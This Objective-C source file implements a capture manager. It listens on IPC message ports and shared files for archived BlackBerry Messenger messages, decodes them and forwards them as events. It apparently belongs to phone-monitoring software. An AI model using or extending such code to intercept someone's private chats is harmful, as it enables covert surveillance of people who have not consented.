//
//  BBMCaptureManager.m
//  BBMCaptureManager
//
//  Created by Ophat Phuetkasickonphasutha on 11/20/13.
//  Copyright 2013 __MyCompanyName__. All rights reserved.
//

#import "BBMCaptureManager.h"

#import "DefStd.h"
#import "FxIMEvent.h"
#import "FxIMEventUtils.h"

#import <UIKit/UIKit.h>

@implementation BBMCaptureManager
@synthesize mEventDelegate;
- (id) init {
	if ((self = [super init])) {
	}
	return (self);
}

- (void) registerEventDelegate: (id <EventDelegate>) aEventDelegate {
	[self setMEventDelegate:aEventDelegate];
}

- (void) unregisterEventDelegate {
	[self setMEventDelegate:nil];
}

- (void) startCapture {
	DLog (@"Start capture BBM messenger");
	if (!mMessagePortReader) {
		mMessagePortReader = [[MessagePortIPCReader alloc] initWithPortName:kBBMMessagePort
												 withMessagePortIPCDelegate:self];
		[mMessagePortReader start];
	}
	if (!mMessagePortReader1) {
		mMessagePortReader1 = [[MessagePortIPCReader alloc] initWithPortName:kBBMMessagePort1
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader1 start];
	}
	if (!mMessagePortReader2) {
		mMessagePortReader2 = [[MessagePortIPCReader alloc] initWithPortName:kBBMMessagePort2
												  withMessagePortIPCDelegate:self];
		[mMessagePortReader2 start];
	}
    
    if ([[[UIDevice currentDevice] systemVersion] intValue] >= 7) {
        if (mSharedFileReader == nil) {
			mSharedFileReader = [[SharedFile2IPCReader alloc] initWithSharedFileName:kBBMMessagePort
																		 withDelegate:self];
			[mSharedFileReader start];
		}
		if (mSharedFileReader1 == nil) {
			mSharedFileReader1 = [[SharedFile2IPCReader alloc] initWithSharedFileName:kBBMMessagePort1
																		 withDelegate:self];
			[mSharedFileReader1 start];
		}
        if (mSharedFileReader2 == nil) {
			mSharedFileReader2 = [[SharedFile2IPCReader alloc] initWithSharedFileName:kBBMMessagePort2
																		 withDelegate:self];
			[mSharedFileReader2 start];
		}
	}
}

- (void) stopCapture {
	DLog (@"Stop capture BBM messenger");
	if (mMessagePortReader) {
		[mMessagePortReader stop];
		[mMessagePortReader release];
		mMessagePortReader = nil;
	}
	if (mMessagePortReader1) {
		[mMessagePortReader1 stop];
		[mMessagePortReader1 release];
		mMessagePortReader1 = nil;
	}
	if (mMessagePortReader2) {
		[mMessagePortReader2 stop];
		[mMessagePortReader2 release];
		mMessagePortReader2 = nil;
	}
    
    if (mSharedFileReader != nil) {
		[mSharedFileReader stop];
		[mSharedFileReader release];
		mSharedFileReader = nil;
	}
    if (mSharedFileReader1 != nil) {
		[mSharedFileReader1 stop];
		[mSharedFileReader1 release];
		mSharedFileReader1 = nil;
	}
    if (mSharedFileReader2 != nil) {
		[mSharedFileReader2 stop];
		[mSharedFileReader2 release];
		mSharedFileReader2 = nil;
	}
}

- (void) dataDidReceivedFromMessagePort: (NSData*) aRawData {
	NSKeyedUnarchiver *unarchiver = [[NSKeyedUnarchiver alloc] initForReadingWithData:aRawData];
    FxIMEvent *imEvent = [unarchiver decodeObjectForKey:kBBMArchied];
	DLog(@"BBM - imEvent = %@", imEvent);
    [unarchiver finishDecoding];	
	
	if ([mEventDelegate respondsToSelector:@selector(eventFinished:)]) {		
		NSArray *imStructureEvents = [FxIMEventUtils digestIMEvent:imEvent];	
		for (FxEvent *imStructureEvent in imStructureEvents) {	
			DLog (@"sending %@ ...", imStructureEvent);
			[mEventDelegate performSelector:@selector(eventFinished:) withObject:imStructureEvent];				
		}
	}
	
	[unarchiver release];
}

- (void) dataDidReceivedFromSharedFile2: (NSData*) aRawData {
	[self dataDidReceivedFromMessagePort:aRawData];
}

- (void) dealloc {
	[self stopCapture];
	[super dealloc];
}

@end
